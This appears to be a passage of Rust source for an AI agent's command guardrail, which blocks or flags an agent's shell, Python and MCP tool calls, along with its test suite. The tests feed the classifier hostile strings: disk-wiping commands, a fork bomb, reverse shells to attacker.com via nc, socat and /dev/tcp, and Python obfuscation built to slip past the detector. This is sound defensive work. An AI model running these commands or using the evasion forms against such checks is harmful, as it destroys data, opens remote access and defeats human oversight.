        let command = match args.get("command").and_then(|v| v.as_str()) {
            Some(c) => c,
            None => return GuardrailDecision::Allow,
        };

        // ── Step 0: execute_code Python classification (D-01/D-02/D-03) ───
        // Entirely separate from the shell tables below — Python source is not
        // shell syntax, and this branch NEVER falls through to Steps 1-3.
        if tool_name == "execute_code" {
            // D-03: the evasion-marker arm fires BEFORE the pattern table and
            // independent of it — a source with zero PYTHON_DANGEROUS_PATTERNS hits
            // can still trip this arm (54-RESEARCH.md Pitfall 2).
            if self.has_python_evasion_marker(command) {
                return GuardrailDecision::Warn {
                    reason: "Python source contains a classification-evasion marker \
                             (getattr/eval/exec/__import__/base64) — approval required \
                             regardless of pattern match (D-03)"
                        .to_string(),
                };
            }
            for regex in &self.python_tier1 {
                if regex.is_match(command) {
                    return GuardrailDecision::Warn {
                        reason: format!(
                            "Python source matches dangerous-pattern table entry — \
                             approval required (D-01): {}",
                            regex.as_str()
                        ),
                    };
                }
            }
            return GuardrailDecision::Allow;
        }

        // ── Step 1: Tier-2 hard-block (D-03) ─────────────────────────────
        // This branch MUST execute before any other decision. Tier-2 is never
        // approvable regardless of pre-seeded approvals or --yolo.
        for regex in &self.tier2 {
            if regex.is_match(command) {
                return GuardrailDecision::Block {
                    reason: format!(
                        "command matches catastrophic Tier-2 denylist pattern — \
                         hard-blocked, not approvable (D-03): {}",
                        regex.as_str()
                    ),
                };
            }
        }

        // ── Step 2: Tier-1 check (network / exfil / eval / pipe-to-shell) ─
        for regex in &self.tier1 {
            if regex.is_match(command) {
                return GuardrailDecision::Warn {
                    reason: format!(
                        "command matches Tier-1 denylist pattern — approval required: {}",
                        regex.as_str()
                    ),
                };
            }
        }

        // ── Step 2b: Shell metachar detection (D-09) ──────────────────────
        // Forces Tier-1 approval (Warn), NOT Block. Legitimate pipes must remain
        // runnable behind the approval gate.
        if self.has_metachar(command) {
            return GuardrailDecision::Warn {
                reason: "command contains shell metacharacters — string-level matching \
                         cannot verify safety; approval required (D-09)"
                    .to_string(),
            };
        }

        // ── Step 3: Allow ─────────────────────────────────────────────────
        GuardrailDecision::Allow
    }

    fn name(&self) -> &str {
        "dangerous-command"
    }
}

// ---------------------------------------------------------------------------
// McpMutationGuardrail — intercepts destructive verbs on prefixed MCP tools (EXEC-05)
// ---------------------------------------------------------------------------

/// Default destructive verb set for [`McpMutationGuardrail`] (D-08).
///
/// Operator config can full-override this list via `mcp_mutation_guardrail.patterns`.
/// Any DEFAULT_VERB absent from the override set triggers a startup `tracing::warn!` (D-10).
///
/// Patterns use `(?:^|[^a-zA-Z0-9])verb(?:[^a-zA-Z0-9]|$)` — underscore is treated as
/// a snake_case separator so `_delete` and `delete_` both trigger. `nodelete` does NOT.
/// **NEVER use `\b`** — the Rust `regex` crate treats `\b` as two literal chars, not a
/// word-boundary assertion. The regression test `regex_no_word_boundary` (EXEC-05-d) asserts
/// no pattern contains this sequence.
pub const DEFAULT_VERBS: &[&str] = &[
    "delete", "remove", "purge", "wipe", "destroy", "put", "patch",
];

/// Guardrail that intercepts destructive-verb tool calls on prefixed MCP tool names.
///
/// **Only** fires when the tool name contains `__` (the MCP server prefix convention, e.g.
/// `cloudflare_bindings__kv_bulk_delete`). Local tools (e.g. `terminal`, `read_file`) always
/// receive `Allow` (D-08).
///
/// Returns [`GuardrailDecision::NeedsApproval`] — the async approval signal. The agent loop
/// (plan 04) parks the call pending `/approve` or `/deny` from the operator (D-11).
pub struct McpMutationGuardrail {
    patterns: Vec<Regex>,
}

impl McpMutationGuardrail {
    /// Create a guardrail with the built-in [`DEFAULT_VERBS`] compiled once.
    pub fn new() -> Self {
        Self::from_verbs(DEFAULT_VERBS)
    }

    /// Build patterns from a slice of verb strings.
    ///
    /// Each verb produces `(?:^|[^a-zA-Z0-9])verb(?:[^a-zA-Z0-9]|$)`. Underscore acts as a
    /// word separator (snake_case), so `_delete` and `delete_` trigger; `nodelete` does not.
    /// NEVER `\b` — two literal chars in the Rust regex crate.
    fn from_verbs(verbs: &[&str]) -> Self {
        let patterns = verbs
            .iter()
            .map(|v| {
                let pat = format!("(?:^|[^a-zA-Z0-9]){}(?:[^a-zA-Z0-9]|$)", regex::escape(v));
                Regex::new(&pat).unwrap_or_else(|e| {
                    panic!("McpMutationGuardrail: invalid pattern for verb '{v}': {e}")
                })
            })
            .collect();
        Self { patterns }
    }

    /// Create from operator config (D-10).
    ///
    /// When `config.patterns` is non-empty it full-overrides [`DEFAULT_VERBS`]. Every built-in
    /// verb absent from the operator set emits `tracing::warn!` so the floor is never silently
    /// weakened.
    pub fn from_config(config: &McpMutationGuardrailConfig) -> Self {
        if config.patterns.is_empty() {
            return Self::new();
        }
        for &verb in DEFAULT_VERBS {
            if !config.patterns.iter().any(|p| p == verb) {
                tracing::warn!(
                    target: "ironhermes::security::guardrail",
                    verb = %verb,
                    "built-in MCP mutation verb REMOVED by operator config; weakens the security floor"
                );
            }
        }
        let verbs: Vec<&str> = config.patterns.iter().map(|s| s.as_str()).collect();
        Self::from_verbs(&verbs)
    }
}

impl Default for McpMutationGuardrail {
    fn default() -> Self {
        Self::new()
    }
}

impl GuardrailHook for McpMutationGuardrail {
    /// Classify an MCP tool call before dispatch.
    ///
    /// - Local tool (no `__` in name) → [`GuardrailDecision::Allow`].
    /// - Prefixed MCP tool without a destructive verb → [`GuardrailDecision::Allow`].
    /// - Prefixed MCP tool with a destructive verb → [`GuardrailDecision::NeedsApproval`] (D-11).
    fn check(&self, tool_name: &str, _args: &serde_json::Value) -> GuardrailDecision {
        // D-08: only intercept prefixed MCP tool names (contain `__`).
        if !tool_name.contains("__") {
            return GuardrailDecision::Allow;
        }
        // LO-02 fix: match against the WHOLE remainder after the FIRST `__`, not just
        // the final `__` segment. `rsplit("__").next()` inspected only the last
        // segment, so a destructive verb in a non-final segment
        // (e.g. "srv__delete__wrapper" → checked only "wrapper") was missed. MCP
        // convention is single-`__` `server__tool`, so for the common case this is
        // identical; the change closes the multi-`__` evasion edge.
        // e.g. "cloudflare_bindings__kv_bulk_delete" → "kv_bulk_delete"
        //      "srv__delete__wrapper"                → "delete__wrapper"
        let tool_part = tool_name.split_once("__").map(|x| x.1).unwrap_or(tool_name);
        for pattern in &self.patterns {
            if pattern.is_match(tool_part) {
                return GuardrailDecision::NeedsApproval {
                    reason: format!(
                        "MCP tool '{}' contains a destructive verb — approval required before execution",
                        tool_name
                    ),
                };
            }
        }
        GuardrailDecision::Allow
    }

    fn name(&self) -> &str {
        "mcp-mutation"
    }
}

// ---------------------------------------------------------------------------
// Tests — DangerousCommandGuardrail (RED phase — types not yet defined above)
// ---------------------------------------------------------------------------

#[cfg(test)]
mod dangerous_tests {
    use super::{
        DANGEROUS_PATTERNS, DangerousCommandGuardrail, DefconLevel, FloorClass, GuardrailDecision,
        GuardrailHook, MUTATION_COMMAND_PATTERNS, PYTHON_DANGEROUS_PATTERNS, RULE_MUTATION_COMMAND,
        RULE_PYTHON_REACH, Regex, floor_class, ironhermes_rule_class,
        reconstruct_python_command_strings,
    };

    fn cmd(s: &str) -> serde_json::Value {
        serde_json::json!({ "command": s })
    }

    // ── Tier-2: catastrophic / hard-block (D-07) ─────────────────────────

    #[test]
    fn tier2_blocks_rm_rf_root() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd("rm -rf /")),
                GuardrailDecision::Block { .. }
            ),
            "rm -rf / must Block"
        );
    }

    /// CR-01 regression: uppercase flags (-R/-F), separate flags (-r -f /),
    /// and long-form flags (--recursive / --force) must all Block.
    /// Also asserts that benign commands are NOT blocked.
    #[test]
    fn tier2_blocks_rm_recursive_variants() {
        let g = DangerousCommandGuardrail::new();
        let must_block = [
            // existing — must still Block
            "rm -rf /",
            "rm -fr /",
            // uppercase aliases (CR-01 fix)
            "rm -Rf /",
            "rm -rF /",
            "rm -RF /",
            // separate short flags (CR-01 fix)
            "rm -r -f /",
            "rm -f -r /",
            // long forms (CR-01 fix)
            "rm --recursive --force /",
            "rm --force --recursive /",
            // subpaths must also Block (scope preservation)
            "rm -Rf /etc",
            "rm --recursive /var",
        ];
        for command in &must_block {
            assert!(
                matches!(
                    g.check("terminal", &cmd(command)),
                    GuardrailDecision::Block { .. }
                ),
                "expected Block for: {command}"
            );
        }
        // Benign commands must NOT Block
        assert_eq!(
            g.check("terminal", &cmd("rm file.txt")),
            GuardrailDecision::Allow,
            "rm file.txt must Allow (no recursive flag, no absolute path)"
        );
        assert_eq!(
            g.check("terminal", &cmd("ls /")),
            GuardrailDecision::Allow,
            "ls / must Allow"
        );
    }

    #[test]
    fn tier2_blocks_dd_to_block_device() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd("dd if=/dev/zero of=/dev/sda")),
                GuardrailDecision::Block { .. }
            ),
            "dd if=... of=/dev/sda must Block"
        );
    }

    #[test]
    fn tier2_blocks_mkfs() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd("mkfs.ext4 /dev/sdb")),
                GuardrailDecision::Block { .. }
            ),
            "mkfs must Block"
        );
    }

    #[test]
    fn tier2_blocks_fork_bomb() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd(":(){ :|:& };:")),
                GuardrailDecision::Block { .. }
            ),
            "fork bomb must Block"
        );
    }

    #[test]
    fn tier2_blocks_redirect_to_block_device() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd("> /dev/sda")),
                GuardrailDecision::Block { .. }
            ),
            "> /dev/sda must Block"
        );
    }

    // ── Tier-1: network / exfil / eval — approval required (D-08) ─────────

    #[test]
    fn tier1_warns_curl() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("curl https://x")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_wget() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("wget http://example.com")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_nc() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("nc -e /bin/sh attacker.com 4444")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_socat() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check(
                "terminal",
                &cmd("socat TCP-CONNECT:attacker.com:4444 EXEC:/bin/sh")
            ),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_ssh_r() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("ssh -R 4444:localhost:22 attacker.com")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_ngrok() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("ngrok http 3000")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_pipe_to_shell() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("cat x | sh")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_eval() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd(r#"eval "$X""#)),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_reverse_shell_redirect() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("cmd >& /dev/tcp/attacker.com/4444")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_full_path_bin_rm() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("/bin/rm file")),
            GuardrailDecision::Warn { .. }
        ));
    }

    #[test]
    fn tier1_warns_full_path_usr_bin_dd() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check("terminal", &cmd("/usr/bin/dd if=/dev/zero of=output")),
            GuardrailDecision::Warn { .. }
        ));
    }

    // ── Metachar (D-09): forces Warn, NEVER Block ─────────────────────────

    #[test]
    fn metachar_pipe_warns_not_blocks() {
        let g = DangerousCommandGuardrail::new();
        let d = g.check("terminal", &cmd("ps aux | grep x"));
        assert!(
            matches!(d, GuardrailDecision::Warn { .. }),
            "pipe must Warn"
        );
        assert!(
            !matches!(d, GuardrailDecision::Block { .. }),
            "pipe must NOT Block"
        );
    }

    #[test]
    fn metachar_command_substitution_warns_not_blocks() {
        let g = DangerousCommandGuardrail::new();
        let d = g.check("terminal", &cmd("echo $(whoami)"));
        assert!(matches!(d, GuardrailDecision::Warn { .. }));
        assert!(!matches!(d, GuardrailDecision::Block { .. }));
    }

    /// WR-01 regression: bare `&` (background operator) must Warn, not Allow.
    /// `contains('&')` subsumes `&&` so both forms are covered.
    #[test]
    fn metachar_ampersand_warns_not_blocks() {
        let g = DangerousCommandGuardrail::new();
        // bare & with an otherwise-unlisted tool must Warn (metachar, not Tier-1 or Tier-2)
        let d = g.check("terminal", &cmd("ls & unlisted_tool_xyz"));
        assert!(
            matches!(d, GuardrailDecision::Warn { .. }),
            "bare & must Warn (WR-01), got: {d:?}"
        );
        assert!(
            !matches!(d, GuardrailDecision::Block { .. }),
            "bare & must NOT Block"
        );
        // && (conditional-and) also covered by contains('&')
        let d2 = g.check("terminal", &cmd("echo a && echo b"));
        assert!(
            matches!(d2, GuardrailDecision::Warn { .. }),
            "&& must Warn, got: {d2:?}"
        );
    }

    #[test]
    fn metachar_semicolon_warns_not_blocks() {
        let g = DangerousCommandGuardrail::new();
        let d = g.check("terminal", &cmd("a; b"));
        assert!(matches!(d, GuardrailDecision::Warn { .. }));
        assert!(!matches!(d, GuardrailDecision::Block { .. }));
    }

    // ── Safe commands → Allow ─────────────────────────────────────────────

    #[test]
    fn safe_ls_allows() {
        let g = DangerousCommandGuardrail::new();
        assert_eq!(
            g.check("terminal", &cmd("ls -la")),
            GuardrailDecision::Allow
        );
    }

    #[test]
    fn safe_cat_allows() {
        let g = DangerousCommandGuardrail::new();
        assert_eq!(
            g.check("terminal", &cmd("cat file.txt")),
            GuardrailDecision::Allow
        );
    }

    #[test]
    fn no_command_arg_allows() {
        let g = DangerousCommandGuardrail::new();
        assert_eq!(
            g.check("terminal", &serde_json::json!({"other": "arg"})),
            GuardrailDecision::Allow
        );
    }

    // ── D-10: operator config overrides ───────────────────────────────────

    #[test]
    fn config_add_tier2_blocks_custom_pattern() {
        use ironhermes_core::DangerousCommandsConfig;
        let config = DangerousCommandsConfig {
            add_tier2: vec!["FORBIDDEN_CMD".to_string()],
            ..Default::default()
        };
        let g = DangerousCommandGuardrail::from_config(&config);
        assert!(matches!(
            g.check("terminal", &cmd("FORBIDDEN_CMD --dangerous")),
            GuardrailDecision::Block { .. }
        ));
        assert_eq!(
            g.check("terminal", &cmd("ls -la")),
            GuardrailDecision::Allow
        );
    }

    #[test]
    fn config_relax_removes_builtin_curl() {
        use ironhermes_core::DangerousCommandsConfig;
        // Exact pattern string from DANGEROUS_PATTERNS for curl
        let curl_pat = r"(?:(?:^|[^a-zA-Z0-9_]))curl(?:[^a-zA-Z0-9_]|$)";
        let config = DangerousCommandsConfig {
            relax: vec![curl_pat.to_string()],
            ..Default::default()
        };
        let g = DangerousCommandGuardrail::from_config(&config);
        // After relaxing, curl (which has no metachar) should be Allow.
        // tracing::warn is emitted inside apply_config_overrides (D-10) — verified
        // by code inspection since inline tests cannot capture tracing spans without
        // a subscriber setup.
        assert_eq!(
            g.check("terminal", &cmd("curl https://example.com")),
            GuardrailDecision::Allow
        );
    }

    // ── Phase 54 Finding 1 (D-01/D-02/D-03): execute_code Python classification ──

    /// A Python source matching a `PYTHON_DANGEROUS_PATTERNS` entry (the ADR's own
    /// evidence line, list-argument form) is Warn — never Allow.
    #[test]
    fn python_execute_code_dangerous_subprocess_warns() {
        let g = DangerousCommandGuardrail::new();
        let source = "import subprocess\nsubprocess.run(['wrangler', 'delete', 'x'])";
        assert!(
            matches!(
                g.check("execute_code", &cmd(source)),
                GuardrailDecision::Warn { .. }
            ),
            "dangerous Python source must Warn, not Allow"
        );
    }

    /// Benign Python (no pattern hit, no evasion marker) is not gated.
    #[test]
    fn python_execute_code_benign_print_allows() {
        let g = DangerousCommandGuardrail::new();
        assert_eq!(
            g.check("execute_code", &cmd("print('hello')")),
            GuardrailDecision::Allow,
            "benign Python source must Allow"
        );
    }

    /// D-03: a source whose ONLY signal is an evasion marker — zero
    /// `PYTHON_DANGEROUS_PATTERNS` hits — still Warns. Proven independently of the
    /// pattern table (54-RESEARCH.md Pitfall 2); Task 3 covers all five markers and
    /// asserts the zero-pattern-hit condition explicitly inside the test.
    #[test]
    fn python_execute_code_evasion_marker_without_pattern_warns() {
        let g = DangerousCommandGuardrail::new();
        let source = "getattr(__builtins__, 'pr' + 'int')('hi')";
        assert!(
            matches!(
                g.check("execute_code", &cmd(source)),
                GuardrailDecision::Warn { .. }
            ),
            "an evasion-marker-only Python source must Warn"
        );
    }

    /// The Python branch changes no non-`execute_code` guardrail decision — a
    /// `terminal` call with a Python-shaped command still runs through the unchanged
    /// shell tables. Task 3 covers this exhaustively with a table of `terminal` cases.
    #[test]
    fn python_execute_code_branch_scoped_to_execute_code_tool() {
        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("terminal", &cmd("rm -rf /")),
                GuardrailDecision::Block { .. }
            ),
            "terminal Tier-2 classification must be unaffected by the Python branch"
        );
    }

    // ── Task 3 (D-03): the evasion arm proven to fire independently of the ─────
    // ── pattern table; the shell path pinned unchanged (54-RESEARCH.md Pitfall 2) ─
    //
    // SECURITY NOTE: every "dangerous Python source" string below (eval/exec/
    // getattr/subprocess/shell=True and friends) is a PLAIN STRING LITERAL used only
    // as classifier input to `DangerousCommandGuardrail::check`. None of it is ever
    // parsed or executed by this test file or by Rust — it is inert test fixture data
    // whose only job is to be pattern-matched, exactly like the pre-existing shell
    // command strings ("rm -rf /", "curl ...") in the tests above.

    /// D-03: the evasion arm fires on a source with ZERO `PYTHON_DANGEROUS_PATTERNS`
    /// hits. The zero-hit condition is asserted INSIDE the test, BEFORE the decision
    /// assertion, so this test cannot be confused with a pattern-table test
    /// (54-RESEARCH.md Pitfall 2: every case also matching a pattern-table entry would
    /// leave the evasion arm's own contribution never exercised).
    #[test]
    fn python_evasion_marker_only_warns() {
        // Builds the string "eval" at runtime via concatenation and resolves it
        // through getattr on __builtins__ — no literal subprocess/os./socket./
        // requests./urllib/shutil/ctypes/pty token anywhere in this source.
        let source = "getattr(__builtins__, 'ev' + 'al')(payload)";

        let zero_pattern_hits = PYTHON_DANGEROUS_PATTERNS
            .iter()
            .all(|p| !Regex::new(p).unwrap().is_match(source));
        assert!(
            zero_pattern_hits,
            "test source must match ZERO PYTHON_DANGEROUS_PATTERNS entries, or this test \
             cannot distinguish the evasion arm from the pattern table: {source}"
        );

        let g = DangerousCommandGuardrail::new();
        assert!(
            matches!(
                g.check("execute_code", &cmd(source)),
                GuardrailDecision::Warn { .. }
            ),
            "an evasion-marker-only source (zero pattern-table hits) must Warn"
        );
    }

    /// Each of the five D-03 markers independently produces `Warn` when it is the
    /// ONLY signal present.
    #[test]
    fn python_evasion_marker_each_alone_warns() {
        let g = DangerousCommandGuardrail::new();
        let cases = [
            ("getattr(__builtins__, 'pr' + 'int')('a')", "getattr"),
            ("eval('1 + 1')", "eval"),
            ("exec('pass')", "exec"),
            ("__import__('os')", "__import__"),
            ("base64.b64decode('aGk=')", "base64"),
        ];
        for (source, marker) in cases {
            assert!(
                matches!(
                    g.check("execute_code", &cmd(source)),
                    GuardrailDecision::Warn { .. }
                ),
                "marker '{marker}' alone must Warn, source: {source}"
            );
        }
    }

    /// A source with NEITHER an evasion marker NOR a pattern-table hit is Allow.
    #[test]
    fn python_benign_source_allows() {
        let g = DangerousCommandGuardrail::new();
        assert_eq!(
            g.check("execute_code", &cmd("x = 1 + 2\nprint(x)")),
            GuardrailDecision::Allow,
            "a source with neither signal must Allow"
        );
    }

    /// The ADR's own evidence line, list-argument form — the shape that motivated the
    /// separate evasion arm in the first place (D-03).
    #[test]
    fn python_dangerous_subprocess_list_form_warns() {
        let g = DangerousCommandGuardrail::new();
        let source = "subprocess.run(['wrangler', 'delete', 'hello-world-worker'], input='y\\n')";
        assert!(
            matches!(
                g.check("execute_code", &cmd(source)),
                GuardrailDecision::Warn { .. }
            ),
            "list-argument subprocess.run must Warn"
        );
    }

    /// The equivalent shell-string form of the same evidence line — proving the test
    /// suite cannot pass on the easy form alone (54-RESEARCH.md Pitfall 2).
    #[test]
    fn python_dangerous_subprocess_string_form_warns() {
        let g = DangerousCommandGuardrail::new();
        let source = "subprocess.run(\"wrangler delete hello-world-worker\", shell=True)";
        assert!(
            matches!(
                g.check("execute_code", &cmd(source)),
                GuardrailDecision::Warn { .. }
            ),
            "shell-string subprocess.run must Warn"
        );
    }

    /// The Python branch is scoped to `execute_code` only. A `terminal` call is
    /// unaffected — including a Python-shaped command that would classify
    /// differently under the `execute_code` branch — because it is judged by the
    /// unchanged shell table. Expected decisions are sourced from the pre-existing
    /// Tier-2/Tier-1/benign tests earlier in this same module.
    #[test]
    fn python_branch_does_not_affect_terminal_tool() {
        // "block" | "warn" | "allow" — a plain tag avoids a function-pointer tuple
        // (clippy::type_complexity) while still asserting the exact decision variant.
        let cases: [(&str, &str, &str); 4] = [
            ("rm -rf /", "block", "Tier-2 must still Block"),
            ("curl https://x", "warn", "Tier-1 must still Warn"),
            ("ls -la", "allow", "benign must still Allow"),
            (
                "subprocess.run(['wrangler', 'delete', 'x'])",
                "allow",
                "a Python-shaped source on the terminal tool must be judged by the \
                 unchanged shell table (no shell pattern/metachar hit here), never \
                 routed through the execute_code Python branch",
            ),
        ];
        let g = DangerousCommandGuardrail::new();
        for (command, expected_kind, msg) in cases {
            let decision = g.check("terminal", &cmd(command));
            let matches_expected = match expected_kind {
                "block" => matches!(decision, GuardrailDecision::Block { .. }),
                "warn" => matches!(decision, GuardrailDecision::Warn { .. }),
                "allow" => matches!(decision, GuardrailDecision::Allow),
                other => panic!("unknown expected_kind tag in test table: {other}"),
            };
            assert!(matches_expected, "{msg}, got: {decision:?}");
        }
    }

    /// Doc-comment fidelity (EXEC-02): no built-in pattern — shell OR Python — uses
    /// the Rust-regex two-literal-character `\b` sequence, which the `regex` crate
    /// does NOT treat as a word-boundary assertion.
    #[test]
    fn regex_no_word_boundary() {
        for (pattern, _tier) in DANGEROUS_PATTERNS {
            assert!(
                !pattern.contains("\\b"),
                "DANGEROUS_PATTERNS entry contains the Rust-regex word-boundary \
                 literal \\b (EXEC-02): {pattern}"
            );
        }
        for pattern in PYTHON_DANGEROUS_PATTERNS {
            assert!(
                !pattern.contains("\\b"),
                "PYTHON_DANGEROUS_PATTERNS entry contains the Rust-regex word-boundary \
                 literal \\b (EXEC-02): {pattern}"
            );
        }
    }

    /// Phase 57 D-23: the mutation-verb list follows the same no-`\b` convention.
    #[test]
    fn mutation_command_patterns_have_no_word_boundary_literal() {
        for pattern in MUTATION_COMMAND_PATTERNS {
            assert!(
                !pattern.contains("\\b"),
                "MUTATION_COMMAND_PATTERNS entry contains the Rust-regex word-boundary \
                 literal \\b: {pattern}"
            );
        }
    }

    fn rule(tool: &str, arg: &str) -> (FloorClass, Option<&'static str>) {
        ironhermes_rule_class(tool, arg, DefconLevel::THREE)
    }

    /// D-23: terminal commands naming a mutation verb are Critical; read-only ones are not.
    #[test]
    fn terminal_mutation_verbs_are_critical() {
        for command in [
            "wrangler delete hello-world-worker",
            "npx wrangler deploy",
            "./node_modules/.bin/wrangler delete x",
            "wrangler r2 bucket delete my-bucket",
            "wrangler kv namespace delete --namespace-id abc",
            "gh repo delete owner/name --yes",
            "gh release delete v1.0",
            "aws s3 rm s3://bucket --recursive",
            "aws s3 rb s3://bucket",
            "gcloud compute instances delete vm-1",
            "kubectl delete pod web-1",
            "terraform destroy -auto-approve",
        ] {
            assert_eq!(
                rule("terminal", command),
                (FloorClass::Critical, Some(RULE_MUTATION_COMMAND)),
                "{command}"
            );
        }
        for command in [
            "wrangler whoami",
            "wrangler tail my-worker",
            "ls -la",
            "gh repo view owner/name",
            "aws s3 ls",
            "kubectl get pods",
            "terraform plan",
            "echo awrangler deploy",
        ] {
            assert_eq!(
                rule("terminal", command),
                (FloorClass::None, None),
                "{command}"
            );
        }
    }

    /// D-23: the rule applies only to the tools it names.
    #[test]
    fn rule_class_ignores_other_tools() {
        assert_eq!(
            rule("read_file", "wrangler delete x"),
            (FloorClass::None, None)
        );
    }

    /// D-23: argv list form, string form, concatenation, importlib hop, tuple, a trailing
    /// variable element, escapes and raw prefixes.
    #[test]
    fn execute_code_reconstruction_catches_the_phase46_shapes() {
        for source in [
            "import subprocess\nsubprocess.run(['wrangler','delete','hello-world-worker'])",
            "import subprocess\nsubprocess.Popen([\"wrangler\", \"delete\", \"x\"])",
            "import os\nos.system('wrangler delete hello-world-worker')",
            "import os\nos.system('wrang' + 'ler delete x')",
            "import os\nos.system('wrang' 'ler delete x')",
            "import importlib\nm = importlib.import_module('subpro'+'cess')\nm.run(['wrangler','delete','hello-world-worker'])",
            "import subprocess\nsubprocess.run(('wrangler', 'delete', 'x'))",
            "import subprocess\nsubprocess.run(['wrangler', 'delete', worker_name])",
            "import subprocess\nsubprocess.run([binary, 'wrangler', 'delete'])",
            "import subprocess\nsubprocess.run(['npx', 'wrangler', 'delete', n], check=True)",
            "import subprocess\nsubprocess.run(['\\x77rangler', 'delete', 'x'])",
            "import subprocess\nsubprocess.run([r'wrangler', 'delete', 'x'])",
        ] {
            assert_eq!(
                rule("execute_code", source),
                (FloorClass::Critical, Some(RULE_MUTATION_COMMAND)),
                "{source}"
            );
        }
    }

    /// D-23 stays quiet on benign and merely similar code.
    #[test]
    fn execute_code_reconstruction_leaves_benign_code_alone() {
        for source in [
            "print('hello')",
            "# wrangler delete x is documented here\nprint(1)",
            "x = ['wrangler', 'tail']\nprint(x)",
            "x = ['gh', 'repo', 'view']\nprint(x)",
            "print('wrangler' + ' is a tool')",
        ] {
            assert_eq!(
                rule("execute_code", source),
                (FloorClass::None, None),
                "{source}"
            );
        }
    }

    /// D-13: a reach marker is Critical at DEFCON 3 and stricter, a FloorWarn at 4-5, and a
    /// non-mutating `subprocess` call is never mistaken for a D-23 mutation.
    #[test]
    fn python_reach_markers_are_critical_at_three_and_floorwarn_above() {
        let five = DefconLevel::FIVE;
        let three = DefconLevel::THREE;
        let four = DefconLevel::try_from(4).expect("level 4");
        for source in [
            "import subprocess\nsubprocess.run(['ls'])",
            "from subprocess import run",
            "import socket",
            "from socket import create_connection",
            "import ctypes",
            "import importlib",
            "x = __import__('os')",
        ] {
            assert_eq!(
                ironhermes_rule_class("execute_code", source, three),
                (FloorClass::Critical, Some(RULE_PYTHON_REACH)),
                "{source}"
            );
            assert_eq!(
                ironhermes_rule_class("execute_code", source, DefconLevel::ONE),
                (FloorClass::Critical, Some(RULE_PYTHON_REACH)),
                "{source}"
            );
            for level in [four, five] {
                assert_eq!(
                    ironhermes_rule_class("execute_code", source, level),
                    (FloorClass::FloorWarn, Some(RULE_PYTHON_REACH)),
                    "{source}"
                );
            }
        }
        assert_eq!(
            ironhermes_rule_class("execute_code", "print(1)", three),
            (FloorClass::None, None)
        );
        // D-13 is an execute_code rule: a terminal command is not scanned for markers.
        assert_eq!(
            ironhermes_rule_class("terminal", "python3 -c 'import socket'", three),
            (FloorClass::None, None)
        );
    }

    /// The reconstruction never panics and stays linear on hostile input.
    #[test]
    fn reconstruction_survives_unterminated_and_deeply_nested_input() {
        let nested = "(".repeat(50_000) + &"'x',".repeat(1000);
        let _ = reconstruct_python_command_strings(&nested);
        let _ = reconstruct_python_command_strings("subprocess.run(['wrangler', 'delete");
        let _ = reconstruct_python_command_strings("x = '''never closed");
        let _ = reconstruct_python_command_strings("'\\x4'");
        assert!(reconstruct_python_command_strings("").is_empty());
    }

    /// `floor_class` maps each decision to its D-24 class.
    #[test]
    fn floor_class_maps_each_decision() {
        let r = || "r".to_string();
        assert_eq!(
            floor_class(&GuardrailDecision::Block { reason: r() }),
            FloorClass::Critical
        );
        assert_eq!(
            floor_class(&GuardrailDecision::Warn { reason: r() }),
            FloorClass::FloorWarn
        );
        assert_eq!(
            floor_class(&GuardrailDecision::NeedsApproval { reason: r() }),
            FloorClass::NeedsApproval
        );
        assert_eq!(floor_class(&GuardrailDecision::Allow), FloorClass::None);
    }

    /// `importlib` is a FloorWarn Python-table hit (Phase 57 D-23).
    #[test]
    fn importlib_is_a_python_table_warn() {
        let g = DangerousCommandGuardrail::new();
        assert!(matches!(
            g.check(
                "execute_code",
                &cmd("import importlib\nimportlib.reload(x)")
            ),
            GuardrailDecision::Warn { .. }
        ));
    }
}

// ---------------------------------------------------------------------------
// Tests — BlocklistGuardrail + utilities (existing)
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::ErrorDetailLevel;

    fn json_null() -> serde_json::Value {
        serde_json::Value::Null
    }

    #[test]
    fn test_blocklist_blocks_named_tool() {
        let guardrail = BlocklistGuardrail::new(vec!["terminal".to_string()]);
        let decision = guardrail.check("terminal", &json_null());
        assert!(
            matches!(decision, GuardrailDecision::Block { .. }),
            "expected Block, got {decision:?}"
        );
    }

    #[test]
    fn test_blocklist_allows_unlisted_tool() {
        let guardrail = BlocklistGuardrail::new(vec!["terminal".to_string()]);
        let decision = guardrail.check("read_file", &json_null());
        assert_eq!(decision, GuardrailDecision::Allow);
    }

    #[test]
    fn test_blocklist_empty_allows_all() {
        let guardrail = BlocklistGuardrail::new(vec![]);
